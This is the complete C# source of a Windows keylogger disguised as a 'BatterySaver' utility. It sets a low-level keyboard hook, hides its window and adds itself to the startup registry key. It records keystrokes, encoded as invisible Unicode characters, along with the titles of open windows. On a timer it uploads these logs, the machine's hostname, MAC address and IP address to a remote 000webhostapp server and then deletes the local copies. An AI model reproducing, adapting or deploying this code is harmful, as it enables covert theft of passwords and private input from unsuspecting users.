using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Linq;
using Timer = System.Timers.Timer;
using Microsoft.Win32;
using System.Net.NetworkInformation;

class Program
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    //////////
    public static string ENC;
    public static string CUAL;
    public static string WINDO;
    public static string WPRN;
    public static string CFNOC;
    public static string FILENAMEONSERVER;
    public static Timer SUT;
    public static Timer STAMP;
    public static Timer PROC;

    [STAThreadAttribute]
    public static string WHE(string VKBCS)  // Finction for White Space Encryption.
    {

       

        for (int K = 0; K < VKBCS.Length; ++K)
        {
            string KS = VKBCS[K].ToString();
           

            switch (KS)
            {

                case "0":
                    ENC = ENC + "⁠";
                    break;

                case "1":
                    ENC = ENC + "​";
                    break;

                case "2":
                    ENC = ENC + " ";
                    break;

                case "3":
                    ENC = ENC + "‍";
                    break;

                case "4":
                    ENC = ENC + "﻿";
                    break;

                case "5":
                    ENC = ENC + " ";
                    break;

                case "6":
                    ENC = ENC + " ";
                    break;

                case "7":
                    ENC = ENC + "᠎";
                    break;

                case "8":
                    ENC = ENC + "‌";
                    break;

                case "9":
                    ENC = ENC + " ";
                    break;

                case ":":
                    ENC = ENC + " ";
                    break;

                case "A":
                    ENC = ENC + " ";
                    break;

                case "M":
                    ENC = ENC + " ";
                    break;
                case "P":
                    ENC = ENC + " ";
                    break;
            }


        }

        return ENC;
    }

    public static string ENCWIN(string WINDATA) // Function For Application Log Conversion.
    {
        byte[] WB = System.Text.ASCIIEncoding.ASCII.GetBytes(WINDATA);
        string ENCWINSTR = Convert.ToBase64String(WB);
        return ENCWINSTR;
    }


    private static void PROCESS(Object source, System.Timers.ElapsedEventArgs e)  // Function to get current running process/applications
    {
        Process[] UPRL = Process.GetProcesses();
        foreach (Process PROS in UPRL)
        {
            if (!String.IsNullOrEmpty(PROS.MainWindowTitle))
            {
                WINDO = WINDO + PROS.ProcessName + " " + "(" + PROS.MainWindowTitle + ")" + "\n";
            }
        }


        try
        {
            StreamWriter ENCWINDO = new StreamWriter(CUAL + "/" + WPRN, true);
            ENCWINDO.Write("\n\n");
            ENCWINDO.Write(ENCWIN(WINDO));
            ENCWINDO.Close();
            WINDO = null;
        }

        catch (Exception WFE)
        {

        }
    }

    private static void TIMESTAMP(Object source, System.Timers.ElapsedEventArgs e) // Function to write timestamps
    {
        DateTime DT = DateTime.Parse(DateTime.Now.ToString());
        string T = DT.ToString("hh:mm:tt");

        try
        {
            FileStream TWK = new FileStream(CUAL + "/" + CFNOC, FileMode.Append, FileAccess.Write, FileShare.Write);
            StreamWriter TWKL = new StreamWriter(TWK);

            string ET = WHE(T);
            ENC = null;
            TWKL.Write("\n" + ET + "\n");
            TWKL.Close();
            ET =null;
            FileStream TWP = new FileStream(CUAL + "/" + WPRN, FileMode.Append, FileAccess.Write, FileShare.Write);
            StreamWriter TWPL = new StreamWriter(TWP);
            TWPL.Write("\n\n" + ENCWIN(T));
            TWPL.Close();
        }

        catch (Exception PFE)
        {

        }
}

    private static void UPLOAD(Object source, System.Timers.ElapsedEventArgs e)  // Function to upload files to the server
    {
        WebClient client = new WebClient();
        client.Credentials = CredentialCache.DefaultCredentials;

        WebClient MKDIR = new WebClient();
        MKDIR.Credentials = CredentialCache.DefaultCredentials;

        try
        {
            string MACADDR = "";
            foreach (NetworkInterface n in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (n.OperationalStatus == OperationalStatus.Up)
                {
                    MACADDR += n.GetPhysicalAddress().ToString();
                    break;
                }
            }

            string NAFOL = Dns.GetHostName();


            string FOLDERNAMEONSERVER = NAFOL + "(" + MACADDR + ")";
            MKDIR.UploadString("https://learn4coll.000webhostapp.com/PROJK/MKDIR.php?data=" + FOLDERNAMEONSERVER, "");  //Making a folder in the server.

            string[] filePaths = Directory.GetFiles(CUAL);

        for (int ZZ = 0; ZZ < filePaths.Length; ++ZZ)
            {

                string NAME = Dns.GetHostName();
                string CURRIP = Dns.GetHostByName(NAME).AddressList[0].ToString();
                string FILEPATH = filePaths[ZZ];

                string[] FTYPE = FILEPATH.Split('\\');
                string FT = FTYPE[FTYPE.Length - 1];

                StreamReader DTREAD = new StreamReader(FILEPATH, true);
                string DTC = DTREAD.ReadLine();
                DTREAD.Close();

                if (FT.StartsWith("IWN"))
                {
                    FILENAMEONSERVER = DTC + "(WINDOW)" + "(" + NAME + ")" + "(" + CURRIP + ")";
                }

                else
                {
                    FILENAMEONSERVER = DTC + "(KEYS)" + "(" + NAME + ")" + "(" + CURRIP + ")";
                }

                string CONTENT = FILENAMEONSERVER + "  " + FOLDERNAMEONSERVER;


                client.UploadString("https://learn4coll.000webhostapp.com/PROJK/SYSsTIMEnDATEnNAMEnIP.php?data=" + CONTENT, "");  //Sending extra information to the server

                client.UploadFile(@"https://learn4coll.000webhostapp.com/PROJK/" + FOLDERNAMEONSERVER + "/" + "UPLOADENC.php/", "POST", FILEPATH);  //Uploading file to the server.


            }


            CFNOC = RANDOMSTR();
            StreamWriter KLD = new StreamWriter(CUAL + "/" + CFNOC, true);
            KLD.Write(DnT() + "\n");
            KLD.Close();

            RANDOMSTR();

            WPRN = "IWN" + RANDOMSTR();
            StreamWriter WD = new StreamWriter(CUAL + "/" + WPRN, true);
            WD.Write(DnT() + "\n");
            WD.Close();

        for (int PP = 0; PP < filePaths.Length; ++PP)
            {
                if (filePaths[PP] == "C:\\ProgramData\\BatterySaverV4.5.7" + CFNOC)
                {

                }

                else if (filePaths[PP] == "C:\\ProgramData\\BatterySaverV4.5.7" + WPRN)
                {

                }
                else
                {
                    File.Delete(filePaths[PP]);
                }
            }


        }


        catch (Exception UE)
        {
            CFNOC = RANDOMSTR();
            StreamWriter KLD = new StreamWriter(CUAL + "/" + CFNOC, true);
            KLD.Write(DnT() + "\n");
            KLD.Close();

            RANDOMSTR();

            WPRN = "IWN" + RANDOMSTR();
            StreamWriter WD = new StreamWriter(CUAL + "/" + WPRN, true);
            WD.Write(DnT() + "\n");
            WD.Close();
        }
    }


    public static string DnT() // Function to get current date and time.
    {

        DateTime DATEnTIME = DateTime.Parse(DateTime.Now.ToString());
        string TIME = DATEnTIME.ToString("hh:mm:ss:tt");
        string DATE = DATEnTIME.ToString("dd:MM:yyyy");
        return "(" + DATE + ")" + "(" + TIME + ")";
    }

    public static void Main()
    {

        RegistryKey STARTUP = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        STARTUP.SetValue("BatterySaverV4.5.7", Application.ExecutablePath.ToString());  // Registers app to Startup List

        CUAL = "C:\\ProgramData";
        CUAL = CUAL + "\\" + "BatterySaverV4.5.7";  // Path where the log files will be saved

        if (!Directory.Exists(CUAL))
        {
            Directory.CreateDirectory(CUAL);  // Creating directory named "BatterySaverV4.5.7"
        }

        CFNOC = RANDOMSTR();
        StreamWriter LFFR = new StreamWriter(CUAL + "/" + CFNOC, true);
        LFFR.Write(DnT() + "\n");
        LFFR.Close();

        RANDOMSTR();

        WPRN = "IWN" + RANDOMSTR();
        StreamWriter WFFR = new StreamWriter(CUAL + "/" + WPRN, true);
        WFFR.Write(DnT() + "\n");
        WFFR.Close();


        SUT = new System.Timers.Timer();
        SUT.Interval = 60000; // 1 Hour Time Interval for Uploading 1Hr = 3600000MilSec
        SUT.Elapsed += UPLOAD;
        SUT.AutoReset = true;
        SUT.Enabled = true;

        PROC = new System.Timers.Timer();
        PROC.Interval = 30000; //5 Min Time Interval for process log 5Min = 300000MilSec
        PROC.Elapsed += PROCESS;
        PROC.AutoReset = true;
        PROC.Enabled = true;

        STAMP = new System.Timers.Timer();
        STAMP.Interval = 30000; // 5 Min Time Interval for timestamp 5Min = 300000MilSec
        STAMP.Elapsed += TIMESTAMP;
        STAMP.AutoReset = true;
        STAMP.Enabled = true;

        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    public static string RANDOMSTR()// Function to generate random names of files
    {
        Random ran = new Random();

        String ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789";
        String SYMBOL = "!@#$%^&()[]{}";

        int length = 5;

        String random = "";

        for (int i = 0; i < length; i++)
        {
            int a = ran.Next(ALPHA.Length);
            random = random + ALPHA.ElementAt(a);
        }
        for (int j = 0; j < length; j++)
        {
            int sz = ran.Next(SYMBOL.Length);
            random = random + SYMBOL.ElementAt(sz);
        }


        return random;

    }

    //////////
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
            GetModuleHandle(curModule.ModuleName), 0);
        }

    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {

        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int VKBC = Marshal.ReadInt32(lParam);

            string KSINT = VKBC.ToString();
            
        try
            {
                ENC=WHE(KSINT);
                StreamWriter ENCWRITE = new StreamWriter(CUAL + "/" + CFNOC, true);
                ENCWRITE.Write(ENC); //Writing the keystroked virtual key value in encrypted form in the file.
                ENC = null;
                ENCWRITE.Write("\n");
                ENCWRITE.Close();
                
            }

            catch (Exception FWR)
            {
            }



        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    
    ////////// Important DLL Imports

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    const int SW_HIDE = 0;

    //////////
}